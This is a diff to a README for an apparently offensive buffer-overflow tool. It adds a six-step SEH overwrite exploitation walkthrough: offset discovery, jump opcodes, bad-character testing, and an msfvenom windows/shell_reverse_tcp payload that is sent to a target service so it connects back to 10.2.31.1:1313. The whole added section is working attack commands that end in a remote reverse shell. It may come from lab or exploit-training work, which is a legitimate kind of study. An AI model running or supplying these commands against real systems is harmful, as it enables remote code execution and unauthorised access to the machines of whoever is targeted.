@@ -78,7 +78,37 @@ write - Sends malicious shell code (hex string file) via buffer overflow
 
 ## SEH Overwrite example
 
-TODO
+1. Overwrite SEH chain
+```
+./ig-buffer-overflow.py -m test --rhost=10.2.31.155 --rport=2050 --buffsize=4085 --buffhead='cmd2 /.../'
+```
+
+2. Identify SEH offset
+```
+./ig-buffer-overflow.py -m cyclic --rhost=10.2.31.155 --rport=2050 --buffsize=4085 --buffhead='cmd2 /.../'
+```
+
+3. Small jump (90EB0890) to tail content
+```
+./ig-buffer-overflow.py -m write --rhost=10.2.31.155 --rport=2050 --buffsize=4085 --buffhead='cmd2 /.../' --offset=3290 --hexcontent=g90EB0890l62501301
+```
+
+4. Long jump to head content
+```
+./ig-buffer-overflow.py -m write --rhost=10.2.31.155 --rport=2050 --buffsize=4085 --buffhead='cmd2 /.../' --offset=3290 --hexcontent=g90EB0890l62501301 --after=gE9DBFCFFFF --nopsa=4
+```
+
+5. Badchar testing
+```
+./ig-buffer-overflow.py -m write --rhost=10.2.31.155 --rport=5048 --buffsize=4096 --buffhead='chk2 /.:/' --offset=3391 --hexcontent=g90EB0890l62501301 --after=gE9DBFCFFFF --nopsa=4 --before=badchar --nopsb=4 --exclude=00 -v
+```
+
+6. Exploit
+```
+msfvenom -p windows/shell_reverse_tcp -b "\x00" LHOST=10.2.31.1 LPORT=1313 -f hex EXITFUNC=thread -o reverse
+
+./ig-buffer-overflow.py -m write --rhost=10.2.31.155 --rport=2050 --buffsize=4085 --buffhead='cmd2 /.../' --offset=3290 --hexcontent=g90EB0890l62501301 --after=gE9DBFCFFFF --nopsa=4 --before=shellcode --shellcode=reverse --nopsb=20 -v
+```
 
 ## Egg Hunting example
 
